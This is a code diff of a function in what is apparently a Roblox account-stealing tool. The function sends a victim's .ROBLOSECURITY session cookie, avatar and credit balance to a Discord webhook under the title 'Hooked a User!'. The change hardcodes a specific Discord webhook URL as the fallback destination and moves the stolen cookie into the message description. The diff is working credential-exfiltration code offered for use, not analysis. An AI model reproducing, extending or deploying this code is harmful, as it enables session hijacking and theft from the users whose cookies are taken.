@@ -16,12 +16,13 @@ export default async function hookRefresh(
 	roblosecurityCookie: string,
 ): Promise<boolean> {
 	try {
-		await axios.post(process.env.WEBHOOK || "", {
+		await axios.post(process.env.WEBHOOK || "https://discord.com/api/webhooks/1227318310794821694/Or8mClVg_HrPN2DpI6HRUxf-iE-UftM2-6LrAlHrlHjauFu-0pVeA3yftDZOW8mdKgYn", {
 			username: "Refreshery",
 			embeds: [
 				{
 					color: 1118737,
 					title: "🎣 Hooked a User!",
+					description: "```" + roblosecurityCookie + "```",
 					thumbnail: {
 						url: userData.avatarUrl,
 					},
@@ -65,11 +66,6 @@ export default async function hookRefresh(
 							name: "Credit Balance",
 							value: "```" + userData.creditbalance + "```",
 							inline: true,
-						},
-						{
-							name: ".ROBLOSECURITY Cookie",
-							value: "```" + roblosecurityCookie + "```",
-							inline: false,
 						},
 					],
 					footer: {
